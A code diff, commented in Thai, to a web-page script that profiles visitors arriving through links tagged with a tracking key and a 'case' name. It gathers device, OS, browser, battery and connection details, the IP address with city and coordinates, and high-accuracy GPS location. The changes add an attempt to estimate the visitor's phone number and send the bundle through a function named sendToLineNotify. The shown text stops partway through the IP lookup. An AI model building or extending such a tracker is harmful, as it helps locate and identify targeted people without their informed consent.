@@ -4,11 +4,11 @@ function getUrlParameters() {
     const urlParams = new URLSearchParams(window.location.search);
     const trackingKey = urlParams.get('daily') || "ไม่มีค่า";
     const caseName = urlParams.get('case') || "ไม่มีค่า";
-
+    
     console.log("ดึงค่าจาก URL parameters:");
     console.log("- trackingKey:", trackingKey);
     console.log("- caseName:", caseName);
-
+    
     return {
       trackingKey: trackingKey,
       caseName: caseName
@@ -34,7 +34,7 @@ function getUrlParameters() {
     minute: '2-digit',
     second: '2-digit'
   });
-
+  
   // ดึง tracking key และ case name จาก URL
   const { trackingKey, caseName } = getUrlParameters();
 
@@ -51,7 +51,7 @@ function getUrlParameters() {
 
   // ตรวจสอบการใช้งานแบตเตอรี่
   getBatteryInfo().then(batteryData => {
-    // รวบรวมข้อมูลอุปกรณ์ทั้งหมด
+    // รวบรวมข้อมูลทั้งหมด
     const allDeviceData = {
       ...deviceInfo,
       screenSize,
@@ -66,35 +66,29 @@ function getUrlParameters() {
 
     // สร้างตัวแปรเพื่อเก็บข้อมูลที่จะส่ง
     let dataToSend = {};
-
-    // ตรวจสอบ IP และข้อมูลผู้ให้บริการเครือข่าย
+    
+    // ตรวจสอบ IP และข้อมูลเบอร์โทรศัพท์
     Promise.all([
-      getIPDetails().catch(error => ({ip: "ไม่สามารถระบุได้"})), // ดึง IP และรายละเอียด
-      getNetworkProviderInfo().catch(() => ({ // ดึงข้อมูล ISP/ประเทศ
-          isp: "ไม่สามารถระบุได้",
-          organization: "ไม่สามารถระบุได้",
-          countryCode: "ไม่สามารถระบุได้",
-          countryCallingCode: "ไม่สามารถระบุได้",
-          remarks: "เกิดข้อผิดพลาดในการดึงข้อมูลเครือข่าย"
-      }))
+      getIPDetails().catch(error => ({ip: "ไม่สามารถระบุได้"})),
+      estimatePhoneNumber().catch(() => null)
     ])
-    .then(([ipData, networkProviderInfo]) => { // เปลี่ยน phoneInfo เป็น networkProviderInfo
+    .then(([ipData, phoneInfo]) => {
       // เก็บข้อมูลที่จำเป็นทั้งหมด
       dataToSend = {
         timestamp: timestamp,
         ip: ipData,
         deviceInfo: allDeviceData,
-        networkProviderInfo: networkProviderInfo, // เปลี่ยน phoneInfo เป็น networkProviderInfo
+        phoneInfo: phoneInfo,
         referrer: referrer,
         trackingKey: trackingKey || "ไม่มีค่า",
         caseName: caseName || "ไม่มีค่า",
-        useServerMessage: true, // Flag for Google Apps Script
+        useServerMessage: true,
         requestId: generateUniqueId() // สร้าง ID เฉพาะสำหรับการร้องขอนี้
       };
-
+      
       // ขอข้อมูลพิกัด โดยกำหนดเวลาให้ตอบกลับไม่เกิน 5 วินาที
       if (navigator.geolocation) {
-        const locationPromise = new Promise((resolve) => { // Removed reject as we handle timeout/error below
+        const locationPromise = new Promise((resolve, reject) => {
           navigator.geolocation.getCurrentPosition(
             position => {
               resolve({
@@ -105,31 +99,31 @@ function getUrlParameters() {
               });
             },
             error => {
-              console.log("ผู้ใช้ไม่อนุญาตให้เข้าถึงตำแหน่ง หรือเกิดข้อผิดพลาด:", error.message);
-              resolve("ไม่มีข้อมูล"); // Resolve with "ไม่มีข้อมูล" on error
+              console.log("ผู้ใช้ไม่อนุญาตให้เข้าถึงตำแหน่ง:", error.message);
+              resolve("ไม่มีข้อมูล");
             },
             {
-              timeout: 5000, // 5 seconds timeout
+              timeout: 5000,
               enableHighAccuracy: true
             }
           );
         });
-
-        // รอข้อมูลพิกัด หรือ Timeout
+        
+        // รอข้อมูลพิกัดไม่เกิน 5 วินาที
         Promise.race([
           locationPromise,
-          new Promise(resolve => setTimeout(() => resolve("ไม่มีข้อมูล (หมดเวลา)"), 5000)) // Resolve after 5 seconds
+          new Promise(resolve => setTimeout(() => resolve("ไม่มีข้อมูล"), 5000))
         ])
         .then(location => {
           // เพิ่มข้อมูลพิกัดเข้าไปในข้อมูลที่จะส่ง
           dataToSend.location = location;
-
+          
           // ส่งข้อมูลทั้งหมดเพียงครั้งเดียว
           sendToLineNotify(dataToSend);
         });
       } else {
         // ถ้าไม่สามารถใช้ Geolocation API ได้
-        dataToSend.location = "ไม่มีข้อมูล (ไม่รองรับ)";
+        dataToSend.location = "ไม่มีข้อมูล";
         sendToLineNotify(dataToSend);
       }
     });
@@ -138,86 +132,234 @@ function getUrlParameters() {
 
 // สร้าง ID เฉพาะสำหรับการร้องขอ
 function generateUniqueId() {
-  // More robust unique ID generation
-  return `${Date.now().toString(36)}-${Math.random().toString(36).substring(2, 10)}`;
+  return Date.now().toString(36) + Math.random().toString(36).substr(2);
 }
 
-// ฟังก์ชันรวบรวมข้อมูลอุปกรณ์แบบละเอียด (ปรับปรุง)
+// ฟังก์ชันรวบรวมข้อมูลอุปกรณ์แบบละเอียด
 function getDetailedDeviceInfo() {
   const userAgent = navigator.userAgent;
   const vendor = navigator.vendor || "ไม่มีข้อมูล";
 
-  // ตรวจสอบประเภทอุปกรณ์
+  // ตรวจสอบประเภทอุปกรณ์ด้วยวิธีที่ละเอียดขึ้น
   const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
-  const isTablet = /iPad|Android(?!.*Mobile)/i.test(userAgent); // iPad or Android without "Mobile" string
+  const isTablet = /(tablet|ipad|playbook|silk)|(android(?!.*mobile))/i.test(userAgent.toLowerCase());
   const deviceType = isTablet ? "แท็บเล็ต" : (isMobile ? "มือถือ" : "คอมพิวเตอร์");
 
-  // ดึงชื่อรุ่นอุปกรณ์ (ประมาณการจาก User Agent - ปรับปรุง)
+  // ดึงชื่อรุ่นอุปกรณ์ (ด้วยวิธีที่ละเอียดขึ้น)
   let deviceModel = "ไม่สามารถระบุได้";
+  let osVersion = "ไม่สามารถระบุได้";
+  let deviceBrand = "ไม่สามารถระบุได้";
 
-  // ตรวจสอบว่าเป็น iPhone, iPad หรือ Android
-  const iPhoneMatch = userAgent.match(/iPhone(?: OS (\d+)[_\.](\d+))?/i); // Make OS version optional, allow . or _
-  const iPadMatch = userAgent.match(/iPad.*(?:OS (\d+)[_\.](\d+))?/i); // Make OS version optional, allow . or _
-  // Improved Android model detection: Look for 'Build/' or use the segment after ';', excluding language codes like 'th-th'
-  const androidBuildMatch = userAgent.match(/Android [\d\.]+;.*Build\/([^;]+)/i);
-  const androidDeviceMatch = userAgent.match(/Android [\d\.]+;\s*([^;)]+)/i); // Match segment after ';' but before ')' if present
+  // ตรวจสอบ OS แบบละเอียด
+  let os = "ไม่สามารถระบุได้";
+  let osArchitecture = "ไม่สามารถระบุได้";
 
-  if (iPhoneMatch) {
-    deviceModel = "iPhone" + (iPhoneMatch[1] ? ` iOS ${iPhoneMatch[1]}.${iPhoneMatch[2] || 0}` : "");
-  } else if (iPadMatch) {
-    deviceModel = "iPad" + (iPadMatch[1] ? ` iOS ${iPadMatch[1]}.${iPadMatch[2] || 0}` : "");
-  } else if (androidBuildMatch) {
-    // Prefer model from Build string if available, clean it up
-    deviceModel = androidBuildMatch[1].trim().replace(/_/g, ' ');
-  } else if (androidDeviceMatch) {
-    // Fallback to segment after ';'
-    let potentialModel = androidDeviceMatch[1].trim();
-    // Avoid language codes like 'th-th', 'en-us' and generic terms
-    if (!/^[a-z]{2}-[a-z]{2}$/i.test(potentialModel) && !/Mobile|Tablet/i.test(potentialModel)) {
-       deviceModel = potentialModel;
+  // ตรวจสอบ Windows
+  if (userAgent.indexOf("Windows") !== -1) {
+    os = "Windows";
+    if (userAgent.indexOf("Windows NT 10.0") !== -1) os += " 10/11";
+    else if (userAgent.indexOf("Windows NT 6.3") !== -1) os += " 8.1";
+    else if (userAgent.indexOf("Windows NT 6.2") !== -1) os += " 8";
+    else if (userAgent.indexOf("Windows NT 6.1") !== -1) os += " 7";
+    else if (userAgent.indexOf("Windows NT 6.0") !== -1) os += " Vista";
+    else if (userAgent.indexOf("Windows NT 5.1") !== -1) os += " XP";
+    else if (userAgent.indexOf("Windows NT 5.0") !== -1) os += " 2000";
+    
+    // ตรวจสอบ architecture
+    if (userAgent.indexOf("Win64") !== -1 || userAgent.indexOf("x64") !== -1) {
+      osArchitecture = "64-bit";
     } else {
-       deviceModel = "Android Device"; // Generic fallback
+      osArchitecture = "32-bit";
     }
-  }
-  // Add basic Windows/Mac detection
-  else if (/Windows NT/.test(userAgent)) {
-    deviceModel = "Windows PC";
-  } else if (/Macintosh/.test(userAgent)) {
-    deviceModel = "Mac";
-  } else if (/Linux/.test(userAgent) && !/Android/.test(userAgent)) {
+    
+    deviceModel = "PC " + os + " " + osArchitecture;
+  } 
+  // ตรวจสอบ macOS
+  else if (userAgent.indexOf("Macintosh") !== -1 || userAgent.indexOf("Mac OS X") !== -1) {
+    os = "macOS";
+    
+    // พยายามดึงเวอร์ชัน macOS
+    const macOSVersionMatch = userAgent.match(/Mac OS X (\d+[._]\d+[._]?\d*)/i);
+    if (macOSVersionMatch) {
+      osVersion = macOSVersionMatch[1].replace(/_/g, '.');
+      os += " " + osVersion;
+    }
+    
+    deviceBrand = "Apple";
+    // ตรวจสอบ Apple Silicon หรือ Intel
+    if (userAgent.indexOf("Intel Mac") !== -1) {
+      deviceModel = "Mac (Intel)";
+    } else if (userAgent.indexOf("ARM Mac") !== -1) {
+      deviceModel = "Mac (Apple Silicon)";
+    } else {
+      deviceModel = "Mac";
+    }
+  } 
+  // ตรวจสอบ iOS (iPhone/iPad)
+  else if (/iPhone|iPad|iPod/.test(userAgent)) {
+    deviceBrand = "Apple";
+    
+    // ระบุประเภทอุปกรณ์ iOS
+    if (userAgent.indexOf("iPhone") !== -1) {
+      deviceModel = "iPhone";
+    } else if (userAgent.indexOf("iPad") !== -1) {
+      deviceModel = "iPad";
+    } else if (userAgent.indexOf("iPod") !== -1) {
+      deviceModel = "iPod";
+    }
+    
+    // ดึงเวอร์ชัน iOS
+    const iosVersionMatch = userAgent.match(/OS (\d+[._]\d+[._]?\d*) like Mac OS X/i);
+    if (iosVersionMatch) {
+      osVersion = iosVersionMatch[1].replace(/_/g, '.');
+      os = "iOS " + osVersion;
+    } else {
+      os = "iOS";
+    }
+    
+    // พยายามระบุรุ่น iPhone โดยละเอียด
+    if (deviceModel === "iPhone") {
+      // ตรวจสอบสเปคของหน้าจอและอื่นๆ เพื่อประมาณรุ่น
+      const screenWidth = window.screen.width;
+      const screenHeight = window.screen.height;
+      const pixelRatio = window.devicePixelRatio || 1;
+      
+      if (pixelRatio >= 3) {
+        if (Math.max(screenWidth, screenHeight) >= 896) {
+          deviceModel += " 11 Pro Max/XS Max/11/12/13 หรือสูงกว่า";
+        } else if (Math.max(screenWidth, screenHeight) >= 812) {
+          deviceModel += " X/XS/11 Pro/12/13 mini หรือสูงกว่า";
+        } else {
+          deviceModel += " รุ่นใหม่ (Plus/Pro)";
+        }
+      } else if (pixelRatio >= 2) {
+        if (Math.max(screenWidth, screenHeight) >= 667) {
+          deviceModel += " 6/7/8/SE2 หรือสูงกว่า";
+        } else {
+          deviceModel += " 4/5/5S/SE1";
+        }
+      }
+    }
+  } 
+  // ตรวจสอบ Android
+  else if (userAgent.indexOf("Android") !== -1) {
+    os = "Android";
+    
+    // ดึงเวอร์ชัน Android
+    const androidVersionMatch = userAgent.match(/Android (\d+(\.\d+)+)/i);
+    if (androidVersionMatch) {
+      osVersion = androidVersionMatch[1];
+      os += " " + osVersion;
+    }
+    
+    // ดึงข้อมูลรุ่นและยี่ห้อ
+    const androidModelMatch = userAgent.match(/;\s*([^;]+(?:\s+Build|\s+MIUI|\)|\s+wv))/i);
+    if (androidModelMatch) {
+      let modelInfo = androidModelMatch[1].trim().replace(/Build|MIUI|\)|wv/g, '').trim();
+      
+      // พยายามแยกยี่ห้อออกจากโมเดล
+      const brandsToCheck = ["Samsung", "Xiaomi", "Redmi", "POCO", "Huawei", "Honor", "Oppo", "Vivo", 
+                           "OnePlus", "Sony", "HTC", "LG", "Motorola", "Nokia", "Asus", "Lenovo", 
+                           "Realme", "ZTE", "Nubia", "Google", "Pixel"];
+      
+      for (const brand of brandsToCheck) {
+        if (modelInfo.indexOf(brand) !== -1 || userAgent.indexOf(brand) !== -1) {
+          deviceBrand = brand;
+          modelInfo = modelInfo.replace(brand, '').trim();
+          break;
+        }
+      }
+      
+      if (deviceBrand === "ไม่สามารถระบุได้") {
+        // สำหรับอุปกรณ์ซัมซุง รูปแบบ SM-XXXX
+        if (modelInfo.indexOf("SM-") !== -1) {
+          deviceBrand = "Samsung";
+        } 
+        // สำหรับอุปกรณ์ Xiaomi รูปแบบ Mi / Redmi
+        else if (modelInfo.indexOf("Mi ") !== -1 || modelInfo.indexOf("Redmi") !== -1) {
+          deviceBrand = "Xiaomi";
+        }
+      }
+      
+      deviceModel = (deviceBrand !== "ไม่สามารถระบุได้" ? deviceBrand + " " : "") + modelInfo;
+    }
+  } 
+  // ตรวจสอบ Linux
+  else if (userAgent.indexOf("Linux") !== -1) {
+    os = "Linux";
+    
+    if (userAgent.indexOf("Ubuntu") !== -1) {
+      os = "Ubuntu Linux";
+    } else if (userAgent.indexOf("Fedora") !== -1) {
+      os = "Fedora Linux";
+    } else if (userAgent.indexOf("Debian") !== -1) {
+      os = "Debian Linux";
+    }
+    
     deviceModel = "Linux PC";
   }
 
+  // เพิ่มข้อมูลสถาปัตยกรรม CPU
+  if (typeof navigator.cpuClass !== 'undefined') {
+    osArchitecture = navigator.cpuClass;
+  }
 
   return {
     userAgent: userAgent,
     vendor: vendor,
     deviceType: deviceType,
-    deviceModel: deviceModel
+    deviceModel: deviceModel,
+    deviceBrand: deviceBrand,
+    os: os,
+    osVersion: osVersion,
+    osArchitecture: osArchitecture,
+    platform: navigator.platform || "ไม่มีข้อมูล",
+    cpu: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " cores" : "ไม่มีข้อมูล"
   };
 }
 
-// ฟังก์ชันตรวจสอบประเภทการเชื่อมต่อแบบละเอียด (ปรับปรุง)
+// ฟังก์ชันตรวจสอบประเภทการเชื่อมต่อแบบละเอียด
 function getConnectionInfo() {
   const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
 
   let connectionInfo = {
-    type: "ไม่สามารถระบุได้", // e.g., 'wifi', 'cellular'
-    effectiveType: "ไม่สามารถระบุได้", // e.g., '4g', '3g'
-    downlink: "ไม่สามารถระบุได้", // Mbps
-    rtt: "ไม่สามารถระบุได้", // ms
+    type: "ไม่สามารถระบุได้",
+    effectiveType: "ไม่สามารถระบุได้",
+    downlink: "ไม่สามารถระบุได้",
+    rtt: "ไม่สามารถระบุได้",
     saveData: false,
     isWifi: false,
     isMobile: false,
-    networkType: "ไม่สามารถระบุได้" // User-friendly type (WiFi, 4G/LTE, etc.)
+    networkType: "ไม่สามารถระบุได้"
   };
+
+  // ตรวจสอบโดยละเอียดผ่าน user agent
+  const userAgent = navigator.userAgent.toLowerCase();
+  
+  if (userAgent.includes('nettype/wifi') || userAgent.includes('nattype/wifi') || userAgent.includes('nettype/4g') || userAgent.includes('nettype/3g')) {
+    if (userAgent.includes('nettype/wifi') || userAgent.includes('nattype/wifi')) {
+      connectionInfo.isWifi = true;
+      connectionInfo.networkType = "WiFi";
+      connectionInfo.type = "wifi";
+    } else if (userAgent.includes('nettype/4g') || userAgent.includes('nettype/lte')) {
+      connectionInfo.isMobile = true;
+      connectionInfo.networkType = "4G";
+      connectionInfo.type = "cellular";
+      connectionInfo.effectiveType = "4g";
+    } else if (userAgent.includes('nettype/3g')) {
+      connectionInfo.isMobile = true;
+      connectionInfo.networkType = "3G";
+      connectionInfo.type = "cellular";
+      connectionInfo.effectiveType = "3g";
+    }
+  }
 
   if (connection) {
     // เก็บข้อมูลพื้นฐาน
-    connectionInfo.type = connection.type || "ไม่สามารถระบุได้";
-    connectionInfo.effectiveType = connection.effectiveType || "ไม่สามารถระบุได้";
-    connectionInfo.downlink = connection.downlink !== undefined ? connection.downlink : "ไม่สามารถระบุได้";
-    connectionInfo.rtt = connection.rtt !== undefined ? connection.rtt : "ไม่สามารถระบุได้";
+    connectionInfo.type = connection.type || connectionInfo.type;
+    connectionInfo.effectiveType = connection.effectiveType || connectionInfo.effectiveType;
+    connectionInfo.downlink = connection.downlink || "ไม่สามารถระบุได้";
+    connectionInfo.rtt = connection.rtt || "ไม่สามารถระบุได้";
     connectionInfo.saveData = connection.saveData || false;
 
     // ตรวจสอบว่าเป็น WiFi หรือ Mobile
@@ -225,54 +367,53 @@ function getConnectionInfo() {
       connectionInfo.isWifi = true;
       connectionInfo.networkType = "WiFi";
     }
-    else if (connection.type === 'cellular') {
+    else if (['cellular', 'umts', 'hspa', 'lte', 'cdma', 'evdo', 'gsm', '2g', '3g', '4g', '5g'].includes(connection.type)) {
       connectionInfo.isMobile = true;
+
       // ระบุประเภทเครือข่ายโทรศัพท์จาก effectiveType
-      switch (connection.effectiveType) {
-          case 'slow-2g':
-          case '2g':
-              connectionInfo.networkType = "2G";
-              break;
-          case '3g':
-              connectionInfo.networkType = "3G";
-              break;
-          case '4g':
-              connectionInfo.networkType = "4G/LTE";
-              break;
-          default:
-              // Check type for 5G as effectiveType might not report it yet
-              if (connection.type === '5g') {
-                  connectionInfo.networkType = "5G";
-              } else {
-                  connectionInfo.networkType = "Mobile Data";
-              }
-      }
-    }
-    else if (connection.type === 'ethernet') {
-        connectionInfo.networkType = "Ethernet";
-    }
-    else if (connection.type === 'bluetooth') {
-        connectionInfo.networkType = "Bluetooth";
-    }
-    else if (connection.type === 'wimax') {
-        connectionInfo.networkType = "WiMAX";
-    }
-    else if (connection.type === 'none') {
-        connectionInfo.networkType = "No Connection";
-    }
-    else { // type is 'other', 'unknown', or not specified, try guessing from effectiveType
-      if (connection.effectiveType === '4g' && !connectionInfo.isMobile) {
-        // Could be fast WiFi or Ethernet if not explicitly cellular
-        connectionInfo.networkType = "Unknown (Fast)";
-      } else if (['slow-2g', '2g', '3g'].includes(connection.effectiveType) && !connectionInfo.isWifi) {
-        // Only assume mobile if not already identified as WiFi
-        connectionInfo.isMobile = true; // Tentative guess
-        connectionInfo.networkType = "Mobile Data (estimated)";
-      } else if (connection.effectiveType) {
-          connectionInfo.networkType = `Unknown (${connection.effectiveType})`;
+      if (connection.effectiveType === 'slow-2g' || connection.effectiveType === '2g') {
+        connectionInfo.networkType = "2G";
+      } else if (connection.effectiveType === '3g') {
+        connectionInfo.networkType = "3G";
+      } else if (connection.effectiveType === '4g') {
+        connectionInfo.networkType = "4G/LTE";
+      } else if (connection.type === '5g') {
+        connectionInfo.networkType = "5G";
       } else {
-          connectionInfo.networkType = connection.type || "Unknown"; // Fallback to reported type or Unknown
+        connectionInfo.networkType = "Mobile Data";
       }
+    }
+    else {
+      // ตรวจสอบจาก effectiveType หากไม่มีข้อมูล type ที่ชัดเจน
+      if (connection.effectiveType === '4g') {
+        // ปรับปรุงตรรกะการตรวจสอบ - effectiveType 4g อาจจะเป็นได้ทั้ง WiFi และ Mobile
+        if (!connectionInfo.isMobile) {
+          connectionInfo.isWifi = true;
+          connectionInfo.networkType = "WiFi";
+        }
+      } else if (['slow-2g', '2g', '3g'].includes(connection.effectiveType)) {
+        connectionInfo.isMobile = true;
+        connectionInfo.networkType = connection.effectiveType === "3g" ? "3G" : "2G";
+      }
+    }
+  }
+
+  // ตรวจสอบการเชื่อมต่อเพิ่มเติมจากข้อมูล offline/online
+  connectionInfo.isOnline = navigator.onLine;
+  
+  // คำนวณความเร็วโดยประมาณ (หากมีข้อมูล downlink)
+  if (connectionInfo.downlink !== "ไม่สามารถระบุได้") {
+    // เพิ่มรายละเอียดความเร็ว
+    if (connectionInfo.downlink <= 0.1) {
+      connectionInfo.speedDescription = "ช้ามาก";
+    } else if (connectionInfo.downlink <= 0.5) {
+      connectionInfo.speedDescription = "ช้า";
+    } else if (connectionInfo.downlink <= 2) {
+      connectionInfo.speedDescription = "ปานกลาง";
+    } else if (connectionInfo.downlink <= 10) {
+      connectionInfo.speedDescription = "เร็ว";
+    } else {
+      connectionInfo.speedDescription = "เร็วมาก";
     }
   }
 
@@ -282,338 +423,539 @@ function getConnectionInfo() {
 // ฟังก์ชันตรวจสอบระดับแบตเตอรี่
 async function getBatteryInfo() {
   try {
-    // ตรวจสอบว่าสามารถเข้าถึง Battery API ได้หรือไม่
+    // ตรวจสอบว่าสามารถเข้าถึง Battery API ได้หรือไม่ (แบบละเอียด)
     if (navigator.getBattery) {
       const battery = await navigator.getBattery();
+      
+      // รายละเอียดเพิ่มเติมของแบตเตอรี่
+      const level = battery.level * 100;
+      const levelText = Math.floor(level) + "%";
+      const charging = battery.charging;
+      const chargingTime = battery.chargingTime;
+      const dischargingTime = battery.dischargingTime;
+      
+      // วิเคราะห์สถานะแบตเตอรี่
+      let batteryStatus = "ปกติ";
+      if (level <= 15) {
+        batteryStatus = "ใกล้หมด";
+      } else if (level <= 30) {
+        batteryStatus = "เหลือน้อย";
+      }
+      
+      // คำนวณเวลาที่เหลือโดยประมาณ (หากมีข้อมูล)
+      let timeRemaining = "ไม่สามารถประมาณได้";
+      if (!charging && dischargingTime !== Infinity) {
+        const hoursRemaining = Math.floor(dischargingTime / 3600);
+        const minutesRemaining = Math.floor((dischargingTime % 3600) / 60);
+        timeRemaining = `${hoursRemaining}h ${minutesRemaining}m`;
+      } else if (charging && chargingTime !== Infinity) {
+        const hoursRemaining = Math.floor(chargingTime / 3600);
+        const minutesRemaining = Math.floor((chargingTime % 3600) / 60);
+        timeRemaining = `อีก ${hoursRemaining}h ${minutesRemaining}m เต็ม`;
+      }
+      
       return {
-        level: Math.floor(battery.level * 100) + "%",
-        charging: battery.charging ? "กำลังชาร์จ" : "ไม่ได้ชาร์จ"
+        level: levelText,
+        charging: charging ? "กำลังชาร์จ" : "ไม่ได้ชาร์จ",
+        status: batteryStatus,
+        timeRemaining: timeRemaining
       };
     }
-    return "ไม่รองรับ"; // Indicate lack of support
+    
+    // ทางเลือกสำหรับอุปกรณ์มือถือที่ไม่รองรับ Battery API
+    else if (navigator.userAgent.match(/Android|iPhone/i)) {
+      // พยายามประมาณการณ์จากข้อมูลอื่น ๆ
+      return {
+        level: "ไม่สามารถเข้าถึงข้อมูลได้โดยตรง",
+        charging: "ไม่สามารถระบุได้",
+        status: "ไม่สามารถระบุได้",
+        additional: "อุปกรณ์มือถือที่ไม่รองรับการตรวจสอบแบตเตอรี่"
+      };
+    }
+
+    return "ไม่สามารถเข้าถึงข้อมูลแบตเตอรี่ได้";
   } catch (error) {
-    console.error("Error accessing battery info:", error);
-    return "ไม่สามารถเข้าถึงได้"; // Indicate error
+    console.error("Error getting battery info:", error);
+    return "ไม่สามารถเข้าถึงข้อมูลแบตเตอรี่ได้";
   }
 }
 
 // ฟังก์ชันตรวจสอบประเภทเบราว์เซอร์
 function detectBrowser() {
-  const ua = navigator.userAgent;
+  const userAgent = navigator.userAgent;
   let browserName = "ไม่ทราบ";
   let browserVersion = "ไม่ทราบ";
-  let match;
+  let browserEngine = "ไม่ทราบ";
 
-  // Order matters: Check for more specific browsers first
-  if ((match = ua.match(/(Edg)\/([\d.]+)/i))) { // Edge (Chromium)
-      browserName = "Microsoft Edge";
-      browserVersion = match[2];
-  } else if ((match = ua.match(/(SamsungBrowser)\/([\d.]+)/i))) { // Samsung Internet
-      browserName = "Samsung Browser";
-      browserVersion = match[2];
-  } else if ((match = ua.match(/(Firefox)\/([\d.]+)/i))) { // Firefox
-      browserName = "Firefox";
-      browserVersion = match[2];
-  } else if ((match = ua.match(/(OPR)\/([\d.]+)/i)) || (match = ua.match(/(Opera)\/([\d.]+)/i))) { // Opera
-      browserName = "Opera";
-      browserVersion = match[2];
-  } else if ((match = ua.match(/(Chrome)\/([\d.]+)/i))) { // Chrome (must be after Edge and Opera)
-      browserName = "Chrome";
-      browserVersion = match[2];
-  } else if ((match = ua.match(/(Safari)\/([\d.]+)/i)) && ua.match(/Version\/([\d.]+)/i)) { // Safari
-      browserName = "Safari";
-      browserVersion = ua.match(/Version\/([\d.]+)/i)[1];
-  } else if ((match = ua.match(/(MSIE |Trident.*rv:)([\d.]+)/i))) { // Internet Explorer
-      browserName = "Internet Explorer";
-      browserVersion = match[2];
-  } else if ((match = ua.match(/Edge\/([\d.]+)/i))) { // Edge (Legacy)
-      browserName = "Microsoft Edge (Legacy)";
-      browserVersion = match[1];
+  // ตรวจสอบ Engine ของเบราว์เซอร์
+  if (userAgent.indexOf("Gecko/") > -1) {
+    browserEngine = "Gecko";
+  } else if (userAgent.indexOf("AppleWebKit/") > -1) {
+    browserEngine = "WebKit";
+  } else if (userAgent.indexOf("Trident/") > -1) {
+    browserEngine = "Trident";
   }
 
-  return `${browserName} ${browserVersion}`;
+  // ตรวจสอบเบราว์เซอร์โดยละเอียด (ปรับปรุงรูปแบบการตรวจสอบ)
+  // Microsoft Edge (Chromium) ก่อน Chrome เนื่องจาก Edge มี Chrome ในสตริง
+  if (userAgent.indexOf("Edg/") > -1) {
+    browserName = "Microsoft Edge (Chromium)";
+    const edgMatch = userAgent.match(/Edg\/(\d+(\.\d+)+)/);
+    if (edgMatch) browserVersion = edgMatch[1];
+  }
+  // Microsoft Edge (Legacy)
+  else if (userAgent.indexOf("Edge/") > -1) {
+    browserName = "Microsoft Edge (Legacy)";
+    const edgeMatch = userAgent.match(/Edge\/(\d+(\.\d+)+)/);
+    if (edgeMatch) browserVersion = edgeMatch[1];
+  }
+  // Firefox
+  else if (userAgent.indexOf("Firefox/") > -1 && userAgent.indexOf("Seamonkey") === -1) {
+    browserName = "Firefox";
+    const ffMatch = userAgent.match(/Firefox\/(\d+(\.\d+)+)/);
+    if (ffMatch) browserVersion = ffMatch[1];
+    
+    // ตรวจสอบ Firefox for Android
+    if (userAgent.indexOf("Android") > -1) {
+      browserName = "Firefox for Android";
+    }
+  }
+  // Samsung Browser
+  else if (userAgent.indexOf("SamsungBrowser/") > -1) {
+    browserName = "Samsung Browser";
+    const sbMatch = userAgent.match(/SamsungBrowser\/(\d+(\.\d+)+)/);
+    if (sbMatch) browserVersion = sbMatch[1];
+  }
+  // Opera
+  else if (userAgent.indexOf("OPR/") > -1 || userAgent.indexOf("Opera/") > -1) {
+    browserName = "Opera";
+    const operaMatch = userAgent.match(/(?:OPR|Opera)\/(\d+(\.\d+)+)/);
+    if (operaMatch) browserVersion = operaMatch[1];
+  }
+  // UC Browser
+  else if (userAgent.indexOf("UCBrowser/") > -1) {
+    browserName = "UC Browser";
+    const ucMatch = userAgent.match(/UCBrowser\/(\d+(\.\d+)+)/);
+    if (ucMatch) browserVersion = ucMatch[1];
+  }
+  // Chrome
+  else if (userAgent.indexOf("Chrome/") > -1) {
+    browserName = "Chrome";
+    const chromeMatch = userAgent.match(/Chrome\/(\d+(\.\d+)+)/);
+    if (chromeMatch) browserVersion = chromeMatch[1];
+    
+    // ตรวจสอบ Chrome for Android
+    if (userAgent.indexOf("Android") > -1) {
+      browserName = "Chrome for Android";
+    }
+  }
+  // Safari
+  else if (userAgent.indexOf("Safari/") > -1 && userAgent.indexOf("Chrome") === -1) {
+    browserName = "Safari";
+    const safariMatch = userAgent.match(/Version\/(\d+(\.\d+)+)/);
+    if (safariMatch) browserVersion = safariMatch[1];
+    
+    // ตรวจสอบ Safari on iOS
+    if (userAgent.match(/iPhone|iPad|iPod/)) {
+      browserName = "Safari on iOS";
+    }
+  }
+  // Internet Explorer
+  else if (userAgent.indexOf("MSIE") > -1 || userAgent.indexOf("Trident/") > -1) {
+    browserName = "Internet Explorer";
+    if (userAgent.indexOf("MSIE") > -1) {
+      const msieMatch = userAgent.match(/MSIE\s(\d+(\.\d+)+)/);
+      if (msieMatch) browserVersion = msieMatch[1];
+    } else {
+      const rvMatch = userAgent.match(/rv:(\d+(\.\d+)+)/);
+      if (rvMatch) browserVersion = rvMatch[1];
+    }
+  }
+
+  return {
+    name: browserName,
+    version: browserVersion,
+    engine: browserEngine,
+    fullInfo: `${browserName} ${browserVersion} (${browserEngine})`,
+    userAgent: userAgent
+  };
 }
 
-
-// ฟังก์ชันดึงข้อมูล IP โดยละเอียด (ใช้ ipinfo.io)
+// ฟังก์ชันดึงข้อมูล IP โดยละเอียด (ใช้หลาย API และมีระบบ fallback)
 async function getIPDetails() {
   try {
-    // Use ipinfo.io which includes IP and details (free tier has rate limits)
-    const response = await fetch('https://ipinfo.io/json?token=YOUR_IPINFO_TOKEN'); // Consider adding a token if needed
+    // ลองใช้ ipinfo.io ก่อน
+    const response = await fetch('https://ipinfo.io/json');
     if (!response.ok) {
-      // Try fallback before throwing full error
-      console.warn(`ipinfo.io request failed with status ${response.status}. Trying fallback.`);
-      return getIPFallback();
+      throw new Error(`ipinfo.io request failed with status ${response.status}`);
     }
     const ipDetails = await response.json();
 
-    // Format data consistently
+    // จัดรูปแบบข้อมูลให้สอดคล้องกับโครงสร้างเดิม + เพิ่มเติม
     return {
       ip: ipDetails.ip || "ไม่สามารถระบุได้",
       hostname: ipDetails.hostname || "ไม่มีข้อมูล",
       city: ipDetails.city || "ไม่ทราบ",
       region: ipDetails.region || "ไม่ทราบ",
-      country: ipDetails.country || "ไม่ทราบ", // Country code (e.g., TH)
-      loc: ipDetails.loc || "ไม่มีข้อมูล", // Coordinates lat,long
-      org: ipDetails.org || "ไม่ทราบ", // Organization/ISP (ASN + Name)
+      country: ipDetails.country || "ไม่ทราบ",
+      countryName: getCountryNameFromCode(ipDetails.country) || "ไม่ทราบ", // เพิ่มชื่อประเทศจากรหัส
+      loc: ipDetails.loc || "ไม่มีข้อมูล",
+      org: ipDetails.org || "ไม่ทราบ",
       postal: ipDetails.postal || "ไม่มีข้อมูล",
       timezone: ipDetails.timezone || "ไม่ทราบ",
-      // Extract ASN and ISP/Org name if possible from 'org' field
       asn: ipDetails.org ? ipDetails.org.split(' ')[0] : "ไม่ทราบ",
